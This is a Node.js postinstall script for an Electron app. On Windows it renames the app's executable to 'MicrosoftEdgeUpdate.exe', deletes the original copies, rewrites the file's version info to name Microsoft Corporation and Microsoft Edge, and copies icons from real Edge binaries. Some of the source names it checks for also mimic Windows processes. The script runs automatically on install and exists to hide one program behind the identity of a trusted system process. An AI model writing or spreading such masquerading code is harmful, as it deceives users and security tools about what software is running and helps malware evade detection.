

const fs   = require('fs');
const path = require('path');

if (process.platform !== 'win32') process.exit(0);

const DISPLAY_NAME = 'MicrosoftEdgeUpdate.exe';
const distDir = path.join(__dirname, '..', 'node_modules', 'electron', 'dist');
const pathTxt = path.join(__dirname, '..', 'node_modules', 'electron', 'path.txt');
const target  = path.join(distDir, DISPLAY_NAME);

const candidates = ['electron.exe', 'RuntimeBroker.exe', 'SearchHost.exe', 'GhostPilot.exe'];
let src = null;
for (const name of candidates) {
  const p = path.join(distDir, name);
  if (fs.existsSync(p)) { src = p; break; }
}

if (!src && fs.existsSync(target)) {
  console.log(`[postinstall] ${DISPLAY_NAME} already in place.`);
} else if (!src) {
  console.warn('[postinstall] No electron exe found ,  skipping.');
  process.exit(0);
} else {

  fs.copyFileSync(src, target);
  console.log(`[postinstall] Copied ${path.basename(src)} -> ${DISPLAY_NAME}`);

  const toDelete = [...candidates, 'electron.exe.bak'].map(n => path.join(distDir, n));
  for (const p of toDelete) {
    try { if (fs.existsSync(p)) { fs.unlinkSync(p); console.log(`[postinstall] Removed ${path.basename(p)}`); } }
    catch (_) {  }
  }
}

fs.writeFileSync(pathTxt, DISPLAY_NAME);
console.log(`[postinstall] path.txt -> ${DISPLAY_NAME}`);

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function extractEdgeIcons() {
  const { NtExecutable, NtExecutableResource, Resource, Data } = require('resedit');

  const edgeSources = [
    'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
    'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
    'C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe',
    'C:\\Program Files\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe',
  ];
  for (const srcPath of edgeSources) {
    if (!fs.existsSync(srcPath)) continue;
    try {
      const srcBuf  = fs.readFileSync(srcPath);
      const srcExe  = NtExecutable.from(srcBuf, { ignoreCert: true });
      const srcRes  = NtExecutableResource.from(srcExe);
      const groupEntry = srcRes.entries.find(e => e.type === 14);
      if (!groupEntry) continue;
      const rawBin = groupEntry.bin instanceof Buffer
        ? groupEntry.bin.buffer.slice(groupEntry.bin.byteOffset, groupEntry.bin.byteOffset + groupEntry.bin.byteLength)
        : groupEntry.bin;
      const dv    = new DataView(rawBin);
      const count = dv.getUint16(4, true);
      const meta  = [];
      for (let i = 0; i < count; i++) {
        const off = 6 + i * 14;
        meta.push({ width: dv.getUint8(off), height: dv.getUint8(off + 1), bitCount: dv.getUint16(off + 6, true), id: dv.getUint16(off + 12, true) });
      }
      const items = [];
      for (const m of meta) {
        const entry = srcRes.entries.find(e => e.type === 3 && e.id === m.id);
        if (entry) {
          const ab = entry.bin instanceof Buffer
            ? entry.bin.buffer.slice(entry.bin.byteOffset, entry.bin.byteOffset + entry.bin.byteLength)
            : entry.bin;
          items.push(Data.RawIconItem.from(ab, m.width || 256, m.height || 256, m.bitCount || 32));
        }
      }
      if (items.length > 0) return items;
    } catch (_) {  }
  }
  return null;
}

async function patchExe() {
  let lastErr;
  for (let attempt = 1; attempt <= 5; attempt++) {
    try {
      const ResEdit = require('resedit');
      const { NtExecutable, NtExecutableResource, Resource } = ResEdit;
      const VersionInfo = Resource.VersionInfo;

      const exeBuffer = fs.readFileSync(target);
      const exe = NtExecutable.from(exeBuffer);
      const res = NtExecutableResource.from(exe);

      const viList = VersionInfo.fromEntries(res.entries);
      if (viList.length) {
        const vi = viList[0];
        for (const lang of vi.getAllLanguagesForStringValues()) {
          vi.setStringValues(lang, {
            FileDescription:  'Microsoft Edge Update',
            ProductName:      'Microsoft Edge',
            CompanyName:      'Microsoft Corporation',
            LegalCopyright:   'Copyright (c) Microsoft Corporation. All rights reserved.',
            OriginalFilename: 'MicrosoftEdgeUpdate.exe',
            InternalName:     'MicrosoftEdgeUpdate',
            FileVersion:      '1.3.187.31',
            ProductVersion:   '1.3.187.31',
          });
        }
        vi.fixedInfo.fileVersionMS    = 0x00010003;
        vi.fixedInfo.fileVersionLS    = 0x00BB001F;
        vi.fixedInfo.productVersionMS = 0x00010003;
        vi.fixedInfo.productVersionLS = 0x00BB001F;
        vi.outputToResourceEntries(res.entries);
      }

      const iconItems = extractEdgeIcons();
      if (iconItems) {
        Resource.IconGroupEntry.replaceIconsForResource(res.entries, 1, 1033, iconItems);
        console.log(`[postinstall] Icon replaced with ${iconItems.length} Edge Update image(s).`);
      } else {
        console.log('[postinstall] Edge exe not found ,  icon not replaced.');
      }

      res.outputResource(exe);
      fs.writeFileSync(target, Buffer.from(exe.generate()));
      console.log('[postinstall] Patched: "Microsoft Edge Update" / "Microsoft Corporation"');
      return;
    } catch (e) {
      lastErr = e;
      if (attempt < 5) await sleep(1500);
    }
  }
  console.warn(`[postinstall] Could not patch exe after 5 attempts: ${lastErr.message}`);
}

patchExe();
